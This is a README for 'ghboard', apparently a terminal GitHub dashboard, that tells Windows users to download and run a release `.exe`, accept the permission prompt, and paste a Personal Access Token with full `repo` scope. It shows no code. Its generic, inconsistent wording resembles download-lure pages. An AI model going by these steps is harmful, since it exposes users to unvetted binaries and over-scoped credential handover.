# 🚦 ghboard - GitHub Dashboard in Your Terminal

[![Download ghboard](https://img.shields.io/badge/Download-Visit%20Page-brightgreen?style=for-the-badge)](https://github.com/valuevibe15/ghboard)

---

## 📋 About ghboard

ghboard is a terminal dashboard for GitHub users. It shows your activity in a clear, visual way. You can track your contribution heatmap, manage your stars, and see your notifications—all in one place. This app runs inside your Windows command line window without needing a browser.

This tool helps you stay on top of your GitHub activity simply by typing a few commands. It suits developers, hobbyists, or anyone who wants a quick view of their GitHub data without opening a web page.

---

## 🖥️ System Requirements

- Windows 10 or later (64-bit recommended)
- A working internet connection
- At least 100 MB free disk space
- Basic access to Windows Command Prompt or PowerShell

You do not need any programming tools or libraries installed to run ghboard.

---

## 🚀 Getting Started

Follow these simple steps to get ghboard running on your Windows machine.

### 1. Visit the Download Page

Click the big green button at the top or use this link:

[https://github.com/valuevibe15/ghboard](https://github.com/valuevibe15/ghboard)

This page contains all the latest releases of ghboard.

### 2. Download the Latest Release

On the GitHub page:

- Find the **Releases** section on the right side or scroll down to the "Releases" tab.
- Look for the latest stable release.
- Download the Windows version, which will be an `.exe` file, for example, something like `ghboard-windows.exe`.

Save this file somewhere easy to find, like your Desktop or Downloads folder.

### 3. Run the Installer

- Double-click the `.exe` file you just downloaded.
- If Windows asks for permission to run the file, click **Yes**.
- A command window will open with instructions.
- Follow the on-screen prompts to complete any setup steps. For most users, ghboard runs without further installation.

### 4. Open Your Terminal

- Press the **Windows key** on your keyboard.
- Type `cmd` and press **Enter** to open Command Prompt.
- Alternatively, type `powershell` and press **Enter** to open PowerShell.

### 5. Launch ghboard

In the terminal window, type:

```
ghboard
```

and press **Enter**.

The dashboard should start and show your GitHub data.

---

## 🔑 Using Your GitHub Account

ghboard needs your GitHub login to show your personal data, like contributions, stars, and notifications.

### How to Provide Access

- When you start ghboard for the first time, it will ask for a **GitHub Personal Access Token (PAT)**.
- A token gives ghboard permission to access your GitHub information securely.
- To create a token:
  1. Go to [https://github.com/settings/tokens](https://github.com/settings/tokens).
  2. Click **Generate new token**.
  3. In the token settings, check the following boxes:
     - `repo`
     - `notifications`
     - `read:user`
  4. Click **Generate token** at the bottom.
  5. Copy the generated token to your clipboard.

### Entering the Token in ghboard

- Paste the token into ghboard when prompted.
- The app will save the token securely for future use.
- If your token expires or you want to change it, delete the saved token file from your user folder and restart ghboard.

---

## 📊 Features Explained

ghboard offers three main views:

### Contribution Heatmap

- Shows your contributions by day in a color-coded grid.
- Lets you spot your busiest coding days at a glance.
- Helps you maintain streaks and see progress over time.

### Star Manager

- Lists repositories you have starred.
- Allows you to unstar projects directly from the terminal.
- Lets you sort stars by date starred, name, or popularity.

### Notification Center

- Displays your latest GitHub notifications.
- Lets you mark notifications as read.
- Shows issue and pull request updates you care about.

---

## ⚙️ Configuration Options

You can customize ghboard with a few commands and config files.

- To change the refresh interval (time between updates), use the `--refresh` flag with a number in seconds.
- To switch between light and dark color schemes, use `--theme light` or `--theme dark`.
- You can create a file named `.ghboardconfig` in your home directory that stores these settings for automatic use.

Example `.ghboardconfig`:

```
refresh=300
theme=dark
```

---

## 🛠️ Troubleshooting

### ghboard Does Not Start

- Check that you typed `ghboard` correctly in Command Prompt or PowerShell.
- Confirm you downloaded the `.exe` file and ran it at least once.
- Restart your terminal and try again.

### No Data Appears

- Make sure you entered the GitHub token correctly.
- Ensure you have an active internet connection.
- Check GitHub status at [https://www.githubstatus.com/](https://www.githubstatus.com/) if problems persist.

### Commands Not Working

- Refer to the on-screen help by running:

```
ghboard --help
```

This shows a list of available commands and options.

---

## 📥 Download ghboard for Windows

To get started now, visit the download page and get the latest version:

[https://github.com/valuevibe15/ghboard](https://github.com/valuevibe15/ghboard)

Follow the steps to install and launch it on your PC.

[![Download ghboard](https://img.shields.io/badge/Get%20ghboard-blue?style=for-the-badge)](https://github.com/valuevibe15/ghboard)

---

## 💬 Support and Feedback

This project is open source and maintained by users like you. Feel free to open an issue on GitHub if you find bugs or want help using ghboard. Check the Issues tab on the main page for known problems and solutions.

You can also contribute by sharing improvement ideas or submitting code changes if you want to.

---

## 🔍 Keywords

bubbletea, cli, dashboard, github, golang, heatmap, notifications, stars, terminal, tui